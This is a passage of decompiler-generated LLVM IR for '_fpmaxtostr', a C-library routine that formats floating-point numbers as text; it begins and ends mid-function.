  uselistorder label %dec_label_pc_805540a, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp103 = call i16 @__decompiler_undefined_function_4()
  %tmp112 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80554a5 = load i32, i32* @edi, align 4
  %v0_80554a6 = load i32, i32* @esi, align 4
  %v0_80554a7 = load i32, i32* @ebx, align 4
  store i32 %v0_80554a7, i32* %stack_var_-16, align 4
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v4_80554bc = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_80554bc = add i3 %v4_80554bc, -1
  store i3 %v5_80554bc, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80554c3 = add i32 %tmp112, 4
  %v2_80554c3 = inttoptr i32 %v1_80554c3 to i32*
  %v3_80554c3 = load i32, i32* %v2_80554c3, align 4
  store i32 %v3_80554c3, i32* %eax.global-to-local, align 4
  %v1_80554ca = add i32 %tmp112, 8
  %v2_80554ca = inttoptr i32 %v1_80554ca to i8*
  %v3_80554ca = load i8, i8* %v2_80554ca, align 1
  %v4_80554ca = zext i8 %v3_80554ca to i32
  %v5_80554ca = load i32, i32* @ecx, align 4
  %v6_80554ca = and i32 %v5_80554ca, -256
  %v7_80554ca = or i32 %v6_80554ca, %v4_80554ca
  store i32 %v7_80554ca, i32* %ecx.global-to-local, align 4
  %v1_80554cd = inttoptr i32 %tmp112 to i32*
  %v2_80554cd = load i32, i32* %v1_80554cd, align 4
  store i32 %v2_80554cd, i32* %ebp.global-to-local, align 4
  %v3_80554cf = and i32 %v3_80554c3, -256
  %v4_80554cf = or i32 %v3_80554cf, %v4_80554ca
  %v1_80554d5 = or i32 %v4_80554cf, 32
  %v3_80554d5 = trunc i32 %v1_80554d5 to i8
  store i32 %v1_80554d5, i32* %eax.global-to-local, align 4
  %v10_80554e0 = icmp eq i8 %v3_80554d5, 97
  %v1_80554e2 = icmp eq i1 %v10_80554e0, false
  br i1 %v1_80554e2, label %dec_label_pc_80554eb, label %dec_label_pc_80554e4

dec_label_pc_80554e4:                             ; preds = %entry
  %v1_80554e4 = add i32 %v7_80554ca, 6
  %v11_80554e4 = trunc i32 %v1_80554e4 to i8
  store i32 %v1_80554e4, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80554eb

dec_label_pc_80554eb:                             ; preds = %entry, %dec_label_pc_80554e4
  %stack_var_-206.0 = phi i8 [ %v3_80554ca, %entry ], [ %v11_80554e4, %dec_label_pc_80554e4 ]
  %v2_80554eb = icmp slt i32 %v2_80554cd, 0
  %v1_80554ed = icmp eq i1 %v2_80554eb, false
  br i1 %v1_80554ed, label %dec_label_pc_80554f4, label %dec_label_pc_80554ef

dec_label_pc_80554ef:                             ; preds = %dec_label_pc_80554eb
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80554f4

dec_label_pc_80554f4:                             ; preds = %dec_label_pc_80554eb, %dec_label_pc_80554ef
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8055503 = add i32 %tmp112, 12
  %v2_8055503 = inttoptr i32 %v1_8055503 to i32*
  %v3_8055503 = load i32, i32* %v2_8055503, align 4
  store i32 %v3_8055503, i32* %eax.global-to-local, align 4
  %v2_8055506 = and i32 %v3_8055503, 2
  %v3_8055506 = icmp eq i32 %v2_8055506, 0
  br i1 %v3_8055506, label %dec_label_pc_8055514, label %dec_label_pc_8055520

dec_label_pc_8055514:                             ; preds = %dec_label_pc_80554f4
  %v2_8055514 = urem i32 %v3_8055503, 2
  %tmp143 = trunc i32 %v2_8055514 to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_8055520

dec_label_pc_8055520:                             ; preds = %dec_label_pc_8055514, %dec_label_pc_80554f4
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_80554f4 ], [ %tmp144, %dec_label_pc_8055514 ]
  %v1_8055534 = udiv i32 %v3_8055503, 256
  %tmp146 = and i32 %v1_8055534, 68
  %tmp147 = icmp eq i32 %tmp146, 64
  br i1 %tmp147, label %dec_label_pc_8055686, label %dec_label_pc_80555a6

dec_label_pc_80555a6:                             ; preds = %dec_label_pc_8055520
  store i3 %v4_80554bc, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_80555ad = add i32 %tmp112, 16
  %v2_80555ad = inttoptr i32 %v1_80555ad to i32*
  store i32 32, i32* %v2_80555ad, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_80555c4 = add i8 %stack_var_-206.0, -96
  %v6_80555c4 = sub i8 95, %stack_var_-206.0
  %v7_80555c4 = and i8 %v6_80555c4, %stack_var_-206.0
  %v8_80555c4 = icmp slt i8 %v7_80555c4, 0
  %v9_80555c4 = icmp eq i8 %v4_80555c4, 0
  %v10_80555c4 = icmp slt i8 %v4_80555c4, 0
  %v3_80555c9 = icmp eq i1 %v10_80555c4, %v8_80555c4
  %v4_80555c9 = icmp eq i1 %v9_80555c4, false
  %v5_80555c9 = and i1 %v4_80555c9, %v3_80555c9
  br i1 %v5_80555c9, label %dec_label_pc_80555d0, label %dec_label_pc_80555cb

dec_label_pc_80555cb:                             ; preds = %dec_label_pc_80555a6
  br label %dec_label_pc_80555d0

dec_label_pc_80555d0:                             ; preds = %dec_label_pc_80555a6, %dec_label_pc_80555cb
  %v2_80555d8 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80555d8, i32* @ecx, align 4
  br label %dec_label_pc_80559ab

dec_label_pc_8055686:                             ; preds = %dec_label_pc_8055520
  %v1_8055545 = add i3 %v4_80554bc, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_805568a = and i32 %v3_8055503, -65536
  %v2_805568f = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_805568f, i32* %edx.global-to-local, align 4
  %v1_8055696 = udiv i16 %tmp103, 256
  %v2_8055696 = zext i16 %v1_8055696 to i32
  %v3_8055696 = mul nuw nsw i32 %v2_8055696, 256
  %tmp148 = urem i16 %tmp103, 256
  %v4_805568a.masked = zext i16 %tmp148 to i32
  %v11_8055696 = or i32 %v4_805568a.masked, %v3_8055696
  %v10_8055696 = or i32 %v11_8055696, %v6_805568a
  %v12_8055696 = or i32 %v10_8055696, 3072
  store i32 %v12_8055696, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8055545, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_80556aa

dec_label_pc_80556aa:                             ; preds = %dec_label_pc_80556fb.dec_label_pc_80556aa_crit_edge, %dec_label_pc_8055686
  %v2_80556c7 = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_8055686 ], [ %v2_80556c7.pre, %dec_label_pc_80556fb.dec_label_pc_80556aa_crit_edge ]
  %v1_80556aa = phi i3 [ %v1_8055545, %dec_label_pc_8055686 ], [ %v1_80556aa.pre, %dec_label_pc_80556fb.dec_label_pc_80556aa_crit_edge ]
  %v3_80556d1 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8055686 ], [ %v0_80556aa.pre, %dec_label_pc_80556fb.dec_label_pc_80556aa_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_805568f, %dec_label_pc_8055686 ], [ %v4_80556cc, %dec_label_pc_80556fb.dec_label_pc_80556aa_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp149 = fptosi x86_fp80 %v3_80556d1 to i32
  store i32 %tmp149, i32* %eax.global-to-local, align 4
  store i32 %tmp149, i32* %ebx.global-to-local, align 4
  %v5_80556c4 = sitofp i32 %tmp149 to x86_fp80
  %v4_80556c7 = fsub x86_fp80 %v2_80556c7, %v5_80556c4
  store i3 %v1_80556aa, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80556cc = add i32 %stack_var_-212.0, 9
  %v4_80556d1 = fmul x86_fp80 %v3_80556d1, %v4_80556c7
  store x86_fp80 %v4_80556d1, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80556d3

dec_label_pc_80556d3:                             ; preds = %dec_label_pc_80556d3.dec_label_pc_80556d3_crit_edge, %dec_label_pc_80556aa
  %v0_80556e5 = phi i32 [ %v0_80556e5.pre, %dec_label_pc_80556d3.dec_label_pc_80556d3_crit_edge ], [ %tmp149, %dec_label_pc_80556aa ]
  %v0_80556d3 = phi i32 [ %v0_80556d3.pre, %dec_label_pc_80556d3.dec_label_pc_80556d3_crit_edge ], [ 0, %dec_label_pc_80556aa ]
  %v1_80556d3 = add i32 %v0_80556d3, 1
  store i32 %v1_80556d3, i32* %esi.global-to-local, align 4
  %v2_80556d8 = sub i32 %v4_80556cc, %v1_80556d3
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_80556e5, 10
  %tmp136 = urem i32 %v0_80556e5, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_80556d8, i32* %eax.global-to-local, align 4
  %v1_80556f1 = or i32 %tmp136, 48
  %v8_80556f1 = trunc i32 %v1_80556f1 to i8
  store i32 %v1_80556f1, i32* %edx.global-to-local, align 4
  %v3_80556f7 = inttoptr i32 %v2_80556d8 to i8*
  store i8 %v8_80556f1, i8* %v3_80556f7, align 1
  %v7_80556f9 = icmp sgt i32 %v1_80556d3, 8
  br i1 %v7_80556f9, label %dec_label_pc_80556fb, label %dec_label_pc_80556d3.dec_label_pc_80556d3_crit_edge

dec_label_pc_80556d3.dec_label_pc_80556d3_crit_edge: ; preds = %dec_label_pc_80556d3
  %v0_80556d3.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_80556e5.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80556d3

dec_label_pc_80556fb:                             ; preds = %dec_label_pc_80556d3
  %v0_80556fb = load i32, i32* @edi, align 4
  %v1_80556fb = add i32 %v0_80556fb, 1
  store i32 %v1_80556fb, i32* @edi, align 4
  %v7_80556ff = icmp sgt i32 %v1_80556fb, 2
  br i1 %v7_80556ff, label %dec_label_pc_8055701, label %dec_label_pc_80556fb.dec_label_pc_80556aa_crit_edge

dec_label_pc_80556fb.dec_label_pc_80556aa_crit_edge: ; preds = %dec_label_pc_80556fb
  %v0_80556aa.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_80556aa.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_80556c7.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80556aa

dec_label_pc_8055701:                             ; preds = %dec_label_pc_80556fb
  %v0_8055701 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8055701 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8055701, x86_fp80* %st0.global-to-local, align 4
  %v2_8055703 = add i3 %v0_8055701, 2
  store i3 %v2_8055703, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8055705 = add i8 %stack_var_-206.0, -96
  %v6_8055705 = sub i8 95, %stack_var_-206.0
  %v7_8055705 = and i8 %v6_8055705, %stack_var_-206.0
  %v8_8055705 = icmp slt i8 %v7_8055705, 0
  %v9_8055705 = icmp eq i8 %v4_8055705, 0
  %v10_8055705 = icmp slt i8 %v4_8055705, 0
  %v3_805570a = icmp eq i1 %v10_8055705, %v8_8055705
  %v4_805570a = icmp eq i1 %v9_8055705, false
  %v5_805570a = and i1 %v4_805570a, %v3_805570a
  br i1 %v5_805570a, label %dec_label_pc_8055719, label %dec_label_pc_805570c

dec_label_pc_805570c:                             ; preds = %dec_label_pc_8055701
  %v4_805570c = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_8055719

dec_label_pc_8055719:                             ; preds = %dec_label_pc_8055701, %dec_label_pc_805570c
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_8055701 ], [ %v4_805570c, %dec_label_pc_805570c ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8055701 ], [ 69, %dec_label_pc_805570c ]
  %v12_8055719 = icmp eq i8 %stack_var_-206.1, 103
  %v1_805571e = icmp eq i1 %v12_8055719, false
  br i1 %v1_805571e, label %dec_label_pc_8055727, label %dec_label_pc_8055720

dec_label_pc_8055720:                             ; preds = %dec_label_pc_8055719
  %v0_8055720 = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_8055720, 1
  br i1 %tmp137, label %dec_label_pc_805572e, label %dec_label_pc_8055724

dec_label_pc_8055724:                             ; preds = %dec_label_pc_8055720
  %v1_8055724 = add i32 %v0_8055720, -1
  store i32 %v1_8055724, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805572e

dec_label_pc_8055727:                             ; preds = %dec_label_pc_8055719
  %v12_8055727 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_8055727, label %dec_label_pc_8055732, label %dec_label_pc_8055727.dec_label_pc_805572e_crit_edge

dec_label_pc_8055727.dec_label_pc_805572e_crit_edge: ; preds = %dec_label_pc_8055727
  %v0_805572e.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805572e

dec_label_pc_805572e:                             ; preds = %dec_label_pc_8055727.dec_label_pc_805572e_crit_edge, %dec_label_pc_8055720, %dec_label_pc_8055724
  %v0_805572e = phi i32 [ %v0_805572e.pre, %dec_label_pc_8055727.dec_label_pc_805572e_crit_edge ], [ %v0_8055720, %dec_label_pc_8055720 ], [ %v1_8055724, %dec_label_pc_8055724 ]
  store i32 %v0_805572e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805575f

dec_label_pc_8055732:                             ; preds = %dec_label_pc_8055727
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_8055736 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8055736 = add i32 %v0_8055736, -1
  store i32 %v2_8055736, i32* %ebx.global-to-local, align 4
  %v5_805573d = icmp slt i32 %v2_8055736, -1
  br i1 %v5_805573d, label %dec_label_pc_805573f, label %dec_label_pc_805575f

dec_label_pc_805573f:                             ; preds = %dec_label_pc_8055732
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8055747 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8055747, i32* %eax.global-to-local, align 4
  %v4_805574f = bitcast i32* %stack_var_-72 to i8*
  %v5_805574f = call i32 @__GI_memset(i8* %v4_805574f, i32 48, i32 21)
  store i32 %v5_805574f, i32* %eax.global-to-local, align 4
  %v0_805576f.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805575f

dec_label_pc_805575f:                             ; preds = %dec_label_pc_8055732, %dec_label_pc_805573f, %dec_label_pc_805572e
  %v1_805577f = phi i32 [ %v0_805572e, %dec_label_pc_805572e ], [ %v0_805576f.pr.pre, %dec_label_pc_805573f ], [ %v2_8055736, %dec_label_pc_8055732 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8055772 = icmp sgt i32 %v1_805577f, 20
  br i1 %v7_8055772, label %dec_label_pc_8055774, label %dec_label_pc_805577f

dec_label_pc_8055774:                             ; preds = %dec_label_pc_805575f
  %v2_8055774 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8055774, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055793.preheader

dec_label_pc_805577f:                             ; preds = %dec_label_pc_805575f
  %v0_805577f = load i32, i32* @esp, align 4
  %v2_805577f = add i32 %v1_805577f, 165
  %v3_805577f = add i32 %v2_805577f, %v0_805577f
  store i32 %v3_805577f, i32* %eax.global-to-local, align 4
  %v1_8055786 = add i32 %v3_805577f, 2
  store i32 %v1_8055786, i32* %ecx.global-to-local, align 4
  %v2_8055789 = inttoptr i32 %v1_8055786 to i8*
  %v3_8055789 = load i8, i8* %v2_8055789, align 1
  %v4_8055789 = add i8 %v3_8055789, -53
  %v9_8055789 = sub i8 52, %v3_8055789
  %v10_8055789 = and i8 %v9_8055789, %v3_8055789
  %v11_8055789 = icmp slt i8 %v10_8055789, 0
  %v13_8055789 = icmp slt i8 %v4_8055789, 0
  %v2_805578d = icmp eq i1 %v13_8055789, %v11_8055789
  %v3_805578d = zext i1 %v2_805578d to i32
  br label %dec_label_pc_8055793.preheader

dec_label_pc_8055793.preheader:                   ; preds = %dec_label_pc_805577f, %dec_label_pc_8055774
  %v0_805579363 = phi i32 [ %v1_8055786, %dec_label_pc_805577f ], [ %v2_8055774, %dec_label_pc_8055774 ]
  %storemerge52 = phi i32 [ %v3_805578d, %dec_label_pc_805577f ], [ 0, %dec_label_pc_8055774 ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055793

dec_label_pc_8055793:                             ; preds = %dec_label_pc_8055793.backedge, %dec_label_pc_8055793.preheader
  %v3_8055794 = phi i32 [ %v3_8055794.pre, %dec_label_pc_8055793.backedge ], [ %storemerge52, %dec_label_pc_8055793.preheader ]
  %v0_8055793 = phi i32 [ %v0_8055796, %dec_label_pc_8055793.backedge ], [ %v0_805579363, %dec_label_pc_8055793.preheader ]
  %v1_8055793 = add i32 %v0_8055793, -1
  store i32 %v1_8055793, i32* %ecx.global-to-local, align 4
  %v1_8055794 = inttoptr i32 %v1_8055793 to i8*
  %v2_8055794 = load i8, i8* %v1_8055794, align 1
  %v4_8055794 = trunc i32 %v3_8055794 to i8
  %v5_8055794 = add i8 %v2_8055794, %v4_8055794
  store i8 %v5_8055794, i8* %v1_8055794, align 1
  %v0_8055796 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055796 = inttoptr i32 %v0_8055796 to i8*
  %v2_8055796 = load i8, i8* %v1_8055796, align 1
  %v3_8055796 = zext i8 %v2_8055796 to i32
  %v4_8055796 = load i32, i32* %edx.global-to-local, align 4
  %v5_8055796 = and i32 %v4_8055796, -256
  %v6_8055796 = or i32 %v5_8055796, %v3_8055796
  store i32 %v6_8055796, i32* %edx.global-to-local, align 4
  %v7_8055798 = icmp eq i8 %v2_8055796, 48
  br i1 %v7_8055798, label %dec_label_pc_8055793.backedge, label %dec_label_pc_805579d

dec_label_pc_8055793.backedge:                    ; preds = %dec_label_pc_8055793, %dec_label_pc_805579d
  %v3_8055794.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055793

dec_label_pc_805579d:                             ; preds = %dec_label_pc_8055793
  %v2_805579d = add i8 %v2_8055796, -57
  %v7_805579d = sub i8 56, %v2_8055796
  %v8_805579d = and i8 %v7_805579d, %v2_8055796
  %v9_805579d = icmp slt i8 %v8_805579d, 0
  %v10_805579d = icmp eq i8 %v2_805579d, 0
  %v11_805579d = icmp slt i8 %v2_805579d, 0
  %v3_80557a0 = icmp eq i1 %v11_805579d, %v9_805579d
  %v4_80557a0 = icmp eq i1 %v10_805579d, false
  %v5_80557a0 = and i1 %v4_80557a0, %v3_80557a0
  br i1 %v5_80557a0, label %dec_label_pc_8055793.backedge, label %dec_label_pc_80557a2

dec_label_pc_80557a2:                             ; preds = %dec_label_pc_805579d
  %v2_80557a2 = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_80557a2, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ugt i32 %v0_8055796, %v2_80557a2
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp145, label %dec_label_pc_80557ad, label %dec_label_pc_80557ba

dec_label_pc_80557ad:                             ; preds = %dec_label_pc_80557a2
  store i32 %v2_805568f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80557c3

dec_label_pc_80557ba:                             ; preds = %dec_label_pc_80557a2
  store i32 %v2_80557a2, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_80557a2, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80557c3

dec_label_pc_80557c3:                             ; preds = %dec_label_pc_80557ad, %dec_label_pc_80557ba
  %v0_80557c3 = phi i32 [ %v0_8055796, %dec_label_pc_80557ad ], [ %v2_80557a2, %dec_label_pc_80557ba ]
  %v1_80557c3 = add i32 %v0_80557c3, 1
  store i32 %v1_80557c3, i32* %eax.global-to-local, align 4
  %v2_80557ca = inttoptr i32 %v1_80557c3 to i8*
  store i8 0, i8* %v2_80557ca, align 1
  br i1 %v1_805571e, label %dec_label_pc_80557f0, label %dec_label_pc_80557d5

dec_label_pc_80557d5:                             ; preds = %dec_label_pc_80557c3
  %v0_80557d5 = load i32, i32* %esi.global-to-local, align 4
  %v5_80557d8 = icmp slt i32 %v0_80557d5, -4
  br i1 %v5_80557d8, label %dec_label_pc_80557fd, label %dec_label_pc_80557da

dec_label_pc_80557da:                             ; preds = %dec_label_pc_80557d5
  %v1_80557da = load i32, i32* %ebx.global-to-local, align 4
  %v7_80557dc = icmp slt i32 %v1_80557da, %v0_80557d5
  br i1 %v7_80557dc, label %dec_label_pc_80557fd, label %dec_label_pc_80557e5

dec_label_pc_80557e5:                             ; preds = %dec_label_pc_80557da
  %v2_80557ec = sub i32 %v1_80557da, %v0_80557d5
  store i32 %v2_80557ec, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8055801

dec_label_pc_80557f0:                             ; preds = %dec_label_pc_80557c3
  %v4_80557f0 = zext i8 %stack_var_-206.1 to i32
  %v5_80557f0 = load i32, i32* %ecx.global-to-local, align 4
  %v6_80557f0 = and i32 %v5_80557f0, -256
  %v7_80557f0 = or i32 %v6_80557f0, %v4_80557f0
  store i32 %v7_80557f0, i32* %ecx.global-to-local, align 4
  %v10_80557f8 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_80557f8, label %dec_label_pc_80557f0.dec_label_pc_8055801_crit_edge, label %dec_label_pc_80557fd

dec_label_pc_80557f0.dec_label_pc_8055801_crit_edge: ; preds = %dec_label_pc_80557f0
  %v0_8055801.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055801

dec_label_pc_80557fd:                             ; preds = %dec_label_pc_80557d5, %dec_label_pc_80557da, %dec_label_pc_80557f0
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_80557f0 ], [ 103, %dec_label_pc_80557da ], [ 103, %dec_label_pc_80557d5 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805580b

dec_label_pc_8055801:                             ; preds = %dec_label_pc_80557f0.dec_label_pc_8055801_crit_edge, %dec_label_pc_80557e5
  %v0_8055801 = phi i32 [ %v0_8055801.pre, %dec_label_pc_80557f0.dec_label_pc_8055801_crit_edge ], [ %v0_80557d5, %dec_label_pc_80557e5 ]
  store i32 %v0_8055801, i32* %ebx.global-to-local, align 4
  %v2_8055803 = icmp slt i32 %v0_8055801, 0
  %v1_8055805 = icmp eq i1 %v2_8055803, false
  br i1 %v1_8055805, label %dec_label_pc_805580b, label %dec_label_pc_8055807

dec_label_pc_8055807:                             ; preds = %dec_label_pc_8055801
  %v0_8055807 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055807 = add i32 %v0_8055807, -1
  store i32 %v1_8055807, i32* %edx.global-to-local, align 4
  %v1_8055808 = inttoptr i32 %v1_8055807 to i8*
  store i8 48, i8* %v1_8055808, align 1
  %v0_8055840.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805580b

dec_label_pc_805580b:                             ; preds = %dec_label_pc_8055801, %dec_label_pc_80557fd, %dec_label_pc_8055807
  %v1_805589b = phi i32 [ %v0_8055801, %dec_label_pc_8055801 ], [ %v0_8055840.pre, %dec_label_pc_8055807 ], [ 0, %dec_label_pc_80557fd ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_8055801 ], [ 102, %dec_label_pc_8055807 ], [ %stack_var_-197.0, %dec_label_pc_80557fd ]
  %v2_805580b = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_805580b, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_8055826 = load i32, i32* %edx.global-to-local, align 4
  %v1_8055826 = inttoptr i32 %v0_8055826 to i8*
  %v2_8055826 = load i8, i8* %v1_8055826, align 1
  %v3_8055826 = zext i8 %v2_8055826 to i32
  %v5_8055826 = and i32 %v2_805580b, -256
  %v6_8055826 = or i32 %v3_8055826, %v5_8055826
  store i32 %v6_8055826, i32* %eax.global-to-local, align 4
  %v1_8055828 = add i32 %v0_8055826, 1
  store i32 %v1_8055828, i32* %edi.global-to-local, align 4
  store i32 %v6_8055826, i32* %stack_var_-22, align 4
  %v2_8055836 = sub i32 %v1_80557c3, %v1_8055828
  store i32 %v2_8055836, i32* %edx.global-to-local, align 4
  %v1_8055840 = icmp eq i32 %v1_805589b, 0
  %v2_8055840 = icmp slt i32 %v1_805589b, 0
  br i1 %v2_8055840, label %dec_label_pc_805588f, label %dec_label_pc_8055844

dec_label_pc_8055844:                             ; preds = %dec_label_pc_805580b
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8055850 = sub i32 %v1_805589b, %v2_8055836
  %v8_8055850 = xor i32 %v2_8055836, %v1_805589b
  %v9_8055850 = xor i32 %v2_8055850, %v1_805589b
  %v10_8055850 = and i32 %v9_8055850, %v8_8055850
  %v11_8055850 = icmp slt i32 %v10_8055850, 0
  %v13_8055850 = icmp slt i32 %v2_8055850, 0
  %v2_8055852 = icmp eq i1 %v13_8055850, %v11_8055850
  br i1 %v2_8055852, label %dec_label_pc_8055854, label %dec_label_pc_8055888

dec_label_pc_8055854:                             ; preds = %dec_label_pc_8055844
  store i32 %v2_8055850, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_8055850, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_8055869, label %dec_label_pc_8055884

dec_label_pc_8055869:                             ; preds = %dec_label_pc_8055854
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8055884

dec_label_pc_8055884:                             ; preds = %dec_label_pc_8055854, %dec_label_pc_8055869
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_8055869 ], [ %stack_var_-132, %dec_label_pc_8055854 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80558a4

dec_label_pc_8055888:                             ; preds = %dec_label_pc_8055844
  %v4_805588a = icmp eq i1 %v1_8055840, false
  br i1 %v4_805588a, label %dec_label_pc_8055895, label %dec_label_pc_805588c

dec_label_pc_805588c:                             ; preds = %dec_label_pc_8055888
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805588f

dec_label_pc_805588f:                             ; preds = %dec_label_pc_805580b, %dec_label_pc_805588c
  %v0_80558d773 = phi i32 [ %v1_805589b, %dec_label_pc_805580b ], [ -1, %dec_label_pc_805588c ]
  %v2_805588f = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805588f, i32* @ecx, align 4
  br label %dec_label_pc_80558a4

dec_label_pc_8055895:                             ; preds = %dec_label_pc_8055888
  %v2_8055899 = add i32 %v1_8055828, %v1_805589b
  store i32 %v2_8055899, i32* %edi.global-to-local, align 4
  %v2_805589b = sub i32 %v2_8055836, %v1_805589b
  store i32 %v2_805589b, i32* %edx.global-to-local, align 4
  %v2_805589d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805589d, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80558a4

dec_label_pc_80558a4:                             ; preds = %dec_label_pc_805588f, %dec_label_pc_8055884, %dec_label_pc_8055895
  %v0_80558d772 = phi i32 [ %v0_80558d773, %dec_label_pc_805588f ], [ -1, %dec_label_pc_8055884 ], [ -1, %dec_label_pc_8055895 ]
  %v0_80558c0 = phi i32 [ %v2_805588f, %dec_label_pc_805588f ], [ %storemerge10, %dec_label_pc_8055884 ], [ %v2_805589d, %dec_label_pc_8055895 ]
  %v0_80558b1 = phi i32 [ %v2_8055836, %dec_label_pc_805588f ], [ 0, %dec_label_pc_8055884 ], [ %v2_805589b, %dec_label_pc_8055895 ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_80558ab = inttoptr i32 %v1_8055503 to i8*
  %v3_80558ab = load i8, i8* %v2_80558ab, align 1
  %v4_80558ab = and i8 %v3_80558ab, 16
  %v5_80558ab = icmp eq i8 %v4_80558ab, 0
